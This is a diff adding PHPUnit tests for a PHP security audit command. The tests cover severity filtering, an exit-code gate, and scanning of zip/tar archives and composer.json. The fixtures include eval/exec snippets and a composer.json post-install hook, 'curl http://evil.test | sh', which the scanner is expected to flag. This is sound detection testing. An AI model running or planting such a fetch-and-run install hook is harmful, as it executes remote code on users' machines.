@@ -35,6 +35,15 @@ final class AuditCommandTest extends TestCase
 
         self::assertTrue($definition->hasOption('cache-path'));
         self::assertTrue($definition->getOption('cache-path')->isValueRequired());
+
+        self::assertTrue($definition->hasOption('min-severity'));
+        self::assertTrue($definition->getOption('min-severity')->isValueRequired());
+        self::assertSame('info', $definition->getOption('min-severity')->getDefault());
+
+        self::assertTrue($definition->hasOption('fail-on'));
+        self::assertTrue($definition->getOption('fail-on')->isValueRequired());
+        // No default: without --fail-on the exit code never changes because of findings.
+        self::assertNull($definition->getOption('fail-on')->getDefault());
     }
 
     public function testExecuteWithoutPathShowsError(): void
@@ -626,6 +635,358 @@ final class AuditCommandTest extends TestCase
 
         self::assertSame(0, $exitCode);
         self::assertStringNotContainsString('is required', $tester->getDisplay());
+    }
+
+    // -------------------------------------------------------------------------
+    // --min-severity filtering + severity breakdown summary
+    // -------------------------------------------------------------------------
+
+    public function testSummaryReportsSeverityBreakdown(): void
+    {
+        $tmpDir = sys_get_temp_dir() . '/audit_test_' . bin2hex(random_bytes(4));
+        mkdir($tmpDir);
+        // eval() -> critical, exec() -> warning
+        file_put_contents($tmpDir . '/mixed.php', '<?php eval($a); exec("id");');
+
+        $command = new AuditCommand();
+        $tester = new CommandTester($command);
+        $exitCode = $tester->execute([
+            '--path' => $tmpDir,
+        ]);
+
+        $display = $tester->getDisplay();
+        $this->cleanupDir($tmpDir);
+
+        self::assertSame(0, $exitCode);
+        self::assertStringContainsString('2 issue(s) found', $display);
+        self::assertStringContainsString('(1 critical, 1 warning, 0 info)', $display);
+        // Default threshold (info) lists everything, so nothing is hidden.
+        self::assertStringNotContainsString('hidden', $display);
+    }
+
+    public function testMinSeverityCriticalListsOnlyCriticalButCountsAll(): void
+    {
+        $tmpDir = sys_get_temp_dir() . '/audit_test_' . bin2hex(random_bytes(4));
+        mkdir($tmpDir);
+        // eval() -> critical, exec() -> warning, assert() -> info
+        file_put_contents($tmpDir . '/mixed.php', '<?php eval($a); exec("id"); assert($x);');
+
+        $command = new AuditCommand();
+        $tester = new CommandTester($command);
+        $exitCode = $tester->execute([
+            '--path' => $tmpDir,
+            '--min-severity' => 'critical',
+        ]);
+
+        $display = $tester->getDisplay();
+        $this->cleanupDir($tmpDir);
+
+        self::assertSame(0, $exitCode);
+        // Only the critical finding is listed individually...
+        self::assertStringContainsString('[critical]', $display);
+        self::assertStringNotContainsString('[warning]', $display);
+        self::assertStringNotContainsString('[info]', $display);
+        // ...but the summary still counts every severity.
+        self::assertStringContainsString('3 issue(s) found', $display);
+        self::assertStringContainsString('(1 critical, 1 warning, 1 info)', $display);
+        // And it reports how many were suppressed by the filter.
+        self::assertStringContainsString('Showing 1 at or above "critical"; 2 hidden', $display);
+    }
+
+    public function testMinSeverityIsCaseInsensitive(): void
+    {
+        $tmpDir = sys_get_temp_dir() . '/audit_test_' . bin2hex(random_bytes(4));
+        mkdir($tmpDir);
+        // eval() -> critical, exec() -> warning
+        file_put_contents($tmpDir . '/mixed.php', '<?php eval($a); exec("id");');
+
+        $command = new AuditCommand();
+        $tester = new CommandTester($command);
+        $exitCode = $tester->execute([
+            '--path' => $tmpDir,
+            '--min-severity' => 'CRITICAL',
+        ]);
+
+        $display = $tester->getDisplay();
+        $this->cleanupDir($tmpDir);
+
+        self::assertSame(0, $exitCode);
+        self::assertStringNotContainsString('Invalid --min-severity', $display);
+        // "CRITICAL" is normalised to "critical": only the critical finding is listed.
+        self::assertStringContainsString('[critical]', $display);
+        self::assertStringNotContainsString('[warning]', $display);
+    }
+
+    public function testInvalidMinSeverityReturnsError(): void
+    {
+        $tmpDir = sys_get_temp_dir() . '/audit_test_' . bin2hex(random_bytes(4));
+        mkdir($tmpDir);
+        file_put_contents($tmpDir . '/clean.php', '<?php echo "ok";');
+
+        $command = new AuditCommand();
+        $tester = new CommandTester($command);
+        $exitCode = $tester->execute([
+            '--path' => $tmpDir,
+            '--min-severity' => 'bogus',
+        ]);
+
+        $display = $tester->getDisplay();
+        $this->cleanupDir($tmpDir);
+
+        self::assertSame(1, $exitCode);
+        self::assertStringContainsString('Invalid --min-severity', $display);
+        self::assertStringContainsString('bogus', $display);
+    }
+
+    // -------------------------------------------------------------------------
+    // --fail-on gate (exit code)
+    // -------------------------------------------------------------------------
+
+    public function testFailOnCriticalExitsNonZeroWhenCriticalFindingPresent(): void
+    {
+        $tmpDir = sys_get_temp_dir() . '/audit_test_' . bin2hex(random_bytes(4));
+        mkdir($tmpDir);
+        file_put_contents($tmpDir . '/evil.php', '<?php eval($x);');
+
+        $command = new AuditCommand();
+        $tester = new CommandTester($command);
+        $exitCode = $tester->execute([
+            '--path' => $tmpDir,
+            '--fail-on' => 'critical',
+        ]);
+
+        $display = $tester->getDisplay();
+        $this->cleanupDir($tmpDir);
+
+        self::assertSame(1, $exitCode);
+        self::assertStringContainsString('Audit gate failed', $display);
+        self::assertStringContainsString('1 finding(s) at or above "critical"', $display);
+    }
+
+    public function testFailOnCriticalSucceedsWhenOnlyLowerSeverityFindings(): void
+    {
+        $tmpDir = sys_get_temp_dir() . '/audit_test_' . bin2hex(random_bytes(4));
+        mkdir($tmpDir);
+        // exec() is a Warning, not Critical — the critical gate must not trip.
+        file_put_contents($tmpDir . '/warn.php', '<?php exec("id");');
+
+        $command = new AuditCommand();
+        $tester = new CommandTester($command);
+        $exitCode = $tester->execute([
+            '--path' => $tmpDir,
+            '--fail-on' => 'critical',
+        ]);
+
+        $display = $tester->getDisplay();
+        $this->cleanupDir($tmpDir);
+
+        self::assertSame(0, $exitCode);
+        self::assertStringNotContainsString('Audit gate failed', $display);
+        // The finding is still reported, the gate just does not consider it failing.
+        self::assertStringContainsString('issue(s) found', $display);
+    }
+
+    public function testFailOnWarningExitsNonZeroOnWarning(): void
+    {
+        $tmpDir = sys_get_temp_dir() . '/audit_test_' . bin2hex(random_bytes(4));
+        mkdir($tmpDir);
+        file_put_contents($tmpDir . '/warn.php', '<?php exec("id");');
+
+        $command = new AuditCommand();
+        $tester = new CommandTester($command);
+        $exitCode = $tester->execute([
+            '--path' => $tmpDir,
+            '--fail-on' => 'warning',
+        ]);
+
+        $display = $tester->getDisplay();
+        $this->cleanupDir($tmpDir);
+
+        self::assertSame(1, $exitCode);
+        self::assertStringContainsString('1 finding(s) at or above "warning"', $display);
+    }
+
+    /**
+     * --fail-on (exit code) is independent of --min-severity (what is listed): a run can list
+     * only critical findings yet still fail because lower-severity findings cross the gate.
+     */
+    public function testFailOnIsIndependentOfMinSeverity(): void
+    {
+        $tmpDir = sys_get_temp_dir() . '/audit_test_' . bin2hex(random_bytes(4));
+        mkdir($tmpDir);
+        // eval() -> critical, exec() -> warning
+        file_put_contents($tmpDir . '/mixed.php', '<?php eval($a); exec("id");');
+
+        $command = new AuditCommand();
+        $tester = new CommandTester($command);
+        $exitCode = $tester->execute([
+            '--path' => $tmpDir,
+            '--min-severity' => 'critical',
+            '--fail-on' => 'warning',
+        ]);
+
+        $display = $tester->getDisplay();
+        $this->cleanupDir($tmpDir);
+
+        self::assertSame(1, $exitCode);
+        // Only the critical finding is listed...
+        self::assertStringContainsString('[critical]', $display);
+        self::assertStringNotContainsString('[warning]', $display);
+        // ...but both findings (critical + warning) cross the "warning" gate.
+        self::assertStringContainsString('2 finding(s) at or above "warning"', $display);
+    }
+
+    public function testFailOnDoesNotFailWhenNoFindings(): void
+    {
+        $tmpDir = sys_get_temp_dir() . '/audit_test_' . bin2hex(random_bytes(4));
+        mkdir($tmpDir);
+        file_put_contents($tmpDir . '/clean.php', '<?php echo "ok";');
+
+        $command = new AuditCommand();
+        $tester = new CommandTester($command);
+        $exitCode = $tester->execute([
+            '--path' => $tmpDir,
+            '--fail-on' => 'info',
+        ]);
+
+        $display = $tester->getDisplay();
+        $this->cleanupDir($tmpDir);
+
+        self::assertSame(0, $exitCode);
+        self::assertStringContainsString('No suspicious patterns', $display);
+        self::assertStringNotContainsString('Audit gate failed', $display);
+    }
+
+    public function testInvalidFailOnReturnsError(): void
+    {
+        $tmpDir = sys_get_temp_dir() . '/audit_test_' . bin2hex(random_bytes(4));
+        mkdir($tmpDir);
+        file_put_contents($tmpDir . '/clean.php', '<?php echo "ok";');
+
+        $command = new AuditCommand();
+        $tester = new CommandTester($command);
+        $exitCode = $tester->execute([
+            '--path' => $tmpDir,
+            '--fail-on' => 'bogus',
+        ]);
+
+        $display = $tester->getDisplay();
+        $this->cleanupDir($tmpDir);
+
+        self::assertSame(1, $exitCode);
+        self::assertStringContainsString('Invalid --fail-on', $display);
+        self::assertStringContainsString('bogus', $display);
+    }
+
+    /**
+     * A built mirror stores package code as zip archives under dist/, not as loose .php files.
+     * Auditing such a directory must look inside the archives, otherwise the command reports
+     * "No PHP files found" and inspects nothing.
+     */
+    public function testExecuteAuditsZipArchivesInPath(): void
+    {
+        $tmpDir = sys_get_temp_dir() . '/audit_test_' . bin2hex(random_bytes(4));
+        mkdir($tmpDir . '/dist', 0755, true);
+
+        $zipPath = $tmpDir . '/dist/vendor-pkg-1.0.0.zip';
+        $zip = new \ZipArchive();
+        $zip->open($zipPath, \ZipArchive::CREATE | \ZipArchive::OVERWRITE);
+        $zip->addFromString('src/Evil.php', '<?php eval($x);');
+        $zip->close();
+
+        $command = new AuditCommand();
+        $tester = new CommandTester($command);
+        $exitCode = $tester->execute([
+            '--path' => $tmpDir,
+        ]);
+
+        $display = $tester->getDisplay();
+        $this->cleanupDir($tmpDir);
+
+        self::assertSame(0, $exitCode);
+        self::assertStringContainsString('issue(s) found', $display);
+        // The finding is located by archive + internal path, with a critical severity tag.
+        self::assertStringContainsString('vendor-pkg-1.0.0.zip/src/Evil.php', $display);
+        self::assertStringContainsString('[critical]', $display);
+        // It must not report the directory as empty.
+        self::assertStringNotContainsString('No PHP files found', $display);
+    }
+
+    public function testExecuteAuditsTarArchivesInPath(): void
+    {
+        $tmpDir = sys_get_temp_dir() . '/audit_test_' . bin2hex(random_bytes(4));
+        mkdir($tmpDir . '/dist', 0755, true);
+
+        $tarPath = $tmpDir . '/dist/vendor-pkg-1.0.0.tar';
+        $phar = new \PharData($tarPath);
+        $phar->addFromString('src/Evil.php', '<?php eval($x);');
+        unset($phar);
+
+        $command = new AuditCommand();
+        $tester = new CommandTester($command);
+        $exitCode = $tester->execute([
+            '--path' => $tmpDir,
+        ]);
+
+        $display = $tester->getDisplay();
+        $this->cleanupDir($tmpDir);
+
+        self::assertSame(0, $exitCode);
+        self::assertStringContainsString('issue(s) found', $display);
+        self::assertStringContainsString('vendor-pkg-1.0.0.tar/src/Evil.php', $display);
+        self::assertStringContainsString('[critical]', $display);
+        self::assertStringNotContainsString('No PHP files found', $display);
+    }
+
+    public function testExecuteAuditsLooseComposerJson(): void
+    {
+        $tmpDir = sys_get_temp_dir() . '/audit_test_' . bin2hex(random_bytes(4));
+        mkdir($tmpDir);
+        file_put_contents($tmpDir . '/composer.json', (string) json_encode([
+            'scripts' => [
+                'post-install-cmd' => 'curl http://evil.test | sh',
+            ],
+        ]));
+
+        $command = new AuditCommand();
+        $tester = new CommandTester($command);
+        $exitCode = $tester->execute([
+            '--path' => $tmpDir,
+        ]);
+
+        $display = $tester->getDisplay();
+        $this->cleanupDir($tmpDir);
+
+        self::assertSame(0, $exitCode);
+        self::assertStringContainsString('issue(s) found', $display);
+        self::assertStringContainsString('[critical]', $display);
+        self::assertStringContainsString('runs a shell command on install', $display);
+        self::assertStringNotContainsString('No PHP files found', $display);
+    }
+
+    public function testExecuteWithCleanZipArchiveReportsNoIssues(): void
+    {
+        $tmpDir = sys_get_temp_dir() . '/audit_test_' . bin2hex(random_bytes(4));
+        mkdir($tmpDir . '/dist', 0755, true);
+
+        $zipPath = $tmpDir . '/dist/vendor-pkg-1.0.0.zip';
+        $zip = new \ZipArchive();
+        $zip->open($zipPath, \ZipArchive::CREATE | \ZipArchive::OVERWRITE);
+        $zip->addFromString('src/Safe.php', '<?php echo "ok";');
+        $zip->close();
+
+        $command = new AuditCommand();
+        $tester = new CommandTester($command);
+        $exitCode = $tester->execute([
+            '--path' => $tmpDir,
+        ]);
+
+        $display = $tester->getDisplay();
+        $this->cleanupDir($tmpDir);
+
+        self::assertSame(0, $exitCode);
+        self::assertStringContainsString('No suspicious patterns', $display);
+        self::assertStringNotContainsString('issue(s) found', $display);
     }
 
     private function cleanupDir(string $path): void
